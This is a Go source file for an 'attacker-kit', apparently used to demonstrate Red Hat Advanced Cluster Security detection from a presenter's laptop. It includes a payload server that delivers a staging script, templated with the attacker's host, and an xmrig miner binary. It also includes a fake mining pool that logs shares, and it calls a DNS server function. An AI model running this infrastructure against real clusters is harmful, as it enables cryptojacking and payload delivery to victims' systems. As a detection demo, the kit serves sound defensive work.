// attacker-kit — the attacker's tools, run on the presenter's laptop (outside the cluster).
//
//	attacker-kit serve   HTTP payload server  (:8080)  serves /stage.sh, /xmrig, ...
//	attacker-kit pool    fake mining pool     (:3333)  accepts "shares", logs them
//	attacker-kit dns     attacker's nameserver (:5300/udp) *.example.local -> laptop
//
// Runs on the presenter's LAPTOP (podman), not in the cluster: to RHACS the attacker
// is an external IP. ATTACKER_HOST (e.g. 192.168.130.1) is templated into stage.sh.
package main

import (
	"bufio"
	"embed"
	"fmt"
	"io/fs"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
)

//go:embed payloads/*
var payloads embed.FS

func serve() {
	sub, _ := fs.Sub(payloads, "payloads")
	mux := http.NewServeMux()
	files := http.FileServer(http.FS(sub))
	mux.HandleFunc("/xmrig", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("DOWNLOAD xmrig by %s", r.RemoteAddr)
		w.Header().Set("Content-Type", "application/octet-stream")
		http.ServeFile(w, r, "/opt/kit/xmrig")
	})
	mux.HandleFunc("/stage.sh", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("DOWNLOAD stage.sh by %s", r.RemoteAddr)
		b, _ := payloads.ReadFile("payloads/stage.sh")
		host := envDefault("ATTACKER_NAME", envDefault("ATTACKER_HOST", "127.0.0.1"))
		w.Header().Set("Content-Type", "text/x-shellscript")
		w.Write([]byte(strings.ReplaceAll(string(b), "__ATTACKER__", host)))
	})
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("DOWNLOAD %s by %s", r.URL.Path, r.RemoteAddr)
		files.ServeHTTP(w, r)
	})
	log.Println("payload server listening on :8080")
	log.Fatal(http.ListenAndServe(":8080", mux))
}

func pool() {
	ln, err := net.Listen("tcp", ":3333")
	if err != nil {
		log.Fatal(err)
	}
	log.Println("mining pool listening on :3333")
	for {
		c, err := ln.Accept()
		if err != nil {
			continue
		}
		go func(c net.Conn) {
			defer c.Close()
			log.Printf("MINER CONNECTED from %s", c.RemoteAddr())
			s := bufio.NewScanner(c)
			shares := 0
			for s.Scan() {
				shares++
				log.Printf("share #%d from %s", shares, c.RemoteAddr())
				fmt.Fprintf(c, `{"id":%d,"jsonrpc":"2.0","result":{"status":"OK"}}`+"\n", shares)
			}
			log.Printf("MINER DISCONNECTED %s after %d shares", c.RemoteAddr(), shares)
		}(c)
	}
}

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintln(os.Stderr, "usage: attacker-kit serve|pool|dns")
		os.Exit(2)
	}
	switch os.Args[1] {
	case "serve":
		serve()
	case "pool":
		pool()
	case "dns":
		dnsServe()
	default:
		fmt.Fprintln(os.Stderr, "usage: attacker-kit serve|pool|dns")
		os.Exit(2)
	}
}
